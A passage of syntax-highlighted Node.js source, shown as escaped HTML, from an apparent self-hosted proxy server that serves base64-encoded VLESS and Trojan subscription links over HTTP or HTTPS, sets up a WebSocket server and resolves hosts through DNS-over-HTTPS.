class=\"o\"\u003e(\u003c/span\u003eTLS_CERT_PATH\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003ekey \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e cert\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e key, cert \u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003ekey \u003cspan class=\"o\"\u003e||\u003c/span\u003e cert\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    console.warn\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Both TLS key and certificate are required; falling back to HTTP.\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e null\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003erequestHandler\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003ereq, res\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003ereq.url \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;/\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003efilePath\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e path.join\u003cspan class=\"o\"\u003e(\u003c/span\u003e__dirname, \u003cspan class=\"s1\"\u003e\u0026#39;index.html\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    fs.readFile\u003cspan class=\"o\"\u003e(\u003c/span\u003efilePath, \u003cspan class=\"s1\"\u003e\u0026#39;utf8\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e(\u003c/span\u003eerr, content\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eerr\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        res.writeHead\u003cspan class=\"o\"\u003e(\u003c/span\u003e200, \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Content-Type\u0026#39;\u003c/span\u003e: \u003cspan class=\"s1\"\u003e\u0026#39;text/html\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        res.end\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Hello world!\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      res.writeHead\u003cspan class=\"o\"\u003e(\u003c/span\u003e200, \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Content-Type\u0026#39;\u003c/span\u003e: \u003cspan class=\"s1\"\u003e\u0026#39;text/html\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      res.end\u003cspan class=\"o\"\u003e(\u003c/span\u003econtent\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003ereq.url \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"sb\"\u003e`\u003c/span\u003e/\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eSUB_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003enamePart\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e NAME ? \u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eNAME\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e-\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eISP\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003e : ISP\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003evlessURL\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sb\"\u003e`\u003c/span\u003evless://\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eUUID\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e@\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDOMAIN\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e?encryption\u003cspan class=\"o\"\u003e=\u003c/span\u003enone\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003esecurity\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003etls\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003esni\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDOMAIN\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e:443\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003efp\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003echrome\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ews\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003ehost\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDOMAIN\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003epath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e%2F\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eWSPATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"c1\"\u003e#${namePart}`;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003etrojanURL\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sb\"\u003e`\u003c/span\u003etrojan://\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eUUID\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e@\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDOMAIN\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e?security\u003cspan class=\"o\"\u003e=\u003c/span\u003etls\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003esni\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDOMAIN\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003efp\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003echrome\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ews\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003ehost\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDOMAIN\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e:443\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003epath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e%2F\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eWSPATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"c1\"\u003e#${namePart}`;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003esubscription\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e vlessURL + \u003cspan class=\"s1\"\u003e\u0026#39;\\n\u0026#39;\u003c/span\u003e + trojanURL\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003ebase64Content\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e Buffer.from\u003cspan class=\"o\"\u003e(\u003c/span\u003esubscription\u003cspan class=\"o\"\u003e)\u003c/span\u003e.toString\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;base64\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    res.writeHead\u003cspan class=\"o\"\u003e(\u003c/span\u003e200, \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Content-Type\u0026#39;\u003c/span\u003e: \u003cspan class=\"s1\"\u003e\u0026#39;text/plain\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    res.end\u003cspan class=\"o\"\u003e(\u003c/span\u003ebase64Content + \u003cspan class=\"s1\"\u003e\u0026#39;\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    res.writeHead\u003cspan class=\"o\"\u003e(\u003c/span\u003e404, \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Content-Type\u0026#39;\u003c/span\u003e: \u003cspan class=\"s1\"\u003e\u0026#39;text/plain\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    res.end\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Not Found\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003etlsOptions\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e getTLSOptions\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003ehttpServer\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e tlsOptions ? https.createServer\u003cspan class=\"o\"\u003e(\u003c/span\u003etlsOptions, requestHandler\u003cspan class=\"o\"\u003e)\u003c/span\u003e : http.createServer\u003cspan class=\"o\"\u003e(\u003c/span\u003erequestHandler\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003ewss\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e new WebSocket.Server\u003cspan class=\"o\"\u003e({\u003c/span\u003e server: httpServer \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003euuid\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e UUID.replace\u003cspan class=\"o\"\u003e(\u003c/span\u003e/-/g, \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003eDNS_SERVERS\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;8.8.4.4\u0026#39;\u003c/span\u003e, \u003cspan class=\"s1\"\u003e\u0026#39;1.1.1.1\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e// Custom DNS\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e resolveHost\u003cspan class=\"o\"\u003e(\u003c/span\u003ehost\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e new Promise\u003cspan class=\"o\"\u003e((\u003c/span\u003eresolve, reject\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e/^\u003cspan class=\"o\"\u003e(\u003c/span\u003e?:\u003cspan class=\"o\"\u003e(\u003c/span\u003e?:25\u003cspan class=\"o\"\u003e[\u003c/span\u003e0-5\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e2\u003cspan class=\"o\"\u003e[\u003c/span\u003e0-4\u003cspan class=\"o\"\u003e][\u003c/span\u003e0-9\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e01\u003cspan class=\"o\"\u003e]\u003c/span\u003e?\u003cspan class=\"o\"\u003e[\u003c/span\u003e0-9\u003cspan class=\"o\"\u003e][\u003c/span\u003e0-9\u003cspan class=\"o\"\u003e]\u003c/span\u003e?\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"se\"\u003e\\.\u003c/span\u003e\u003cspan class=\"o\"\u003e){\u003c/span\u003e3\u003cspan class=\"o\"\u003e}(\u003c/span\u003e?:25\u003cspan class=\"o\"\u003e[\u003c/span\u003e0-5\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e2\u003cspan class=\"o\"\u003e[\u003c/span\u003e0-4\u003cspan class=\"o\"\u003e][\u003c/span\u003e0-9\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e01\u003cspan class=\"o\"\u003e]\u003c/span\u003e?\u003cspan class=\"o\"\u003e[\u003c/span\u003e0-9\u003cspan class=\"o\"\u003e][\u003c/span\u003e0-9\u003cspan class=\"o\"\u003e]\u003c/span\u003e?\u003cspan class=\"o\"\u003e)\u003c/span\u003e$/.test\u003cspan class=\"o\"\u003e(\u003c/span\u003ehost\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      resolve\u003cspan class=\"o\"\u003e(\u003c/span\u003ehost\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003elet\u003c/span\u003e \u003cspan class=\"nv\"\u003eattempts\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 0\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efunction\u003c/span\u003e tryNextDNS\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eattempts \u0026gt;\u003cspan class=\"o\"\u003e=\u003c/span\u003e DNS_SERVERS.length\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        reject\u003cspan class=\"o\"\u003e(\u003c/span\u003enew Error\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003eFailed to resolve \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003ehost\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e with all DNS servers\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"nv\"\u003ednsServer\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e DNS_SERVERS\u003cspan class=\"o\"\u003e[\u003c/span\u003eattempts\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      attempts++\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"nv\"\u003ednsQuery\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sb\"\u003e`\u003c/span\u003ehttps://dns.google/resolve?name\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eencodeURIComponent\u003c/span\u003e\u003cspan class=\"p\"\u003e(host)\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eA\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      axios.get\u003cspan class=\"o\"\u003e(\u003c/span\u003ednsQuery, \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        timeout: 5000,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        headers: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"s1\"\u003e\u0026#39;Accept\u0026#39;\u003c/span\u003e: \u003cspan class=\"s1\"\u003e\u0026#39;application/dns-json\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e})\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      .then\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eresponse\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        const \u003cspan class=\"nv\"\u003edata\u003c/span\u003e \u003cspan 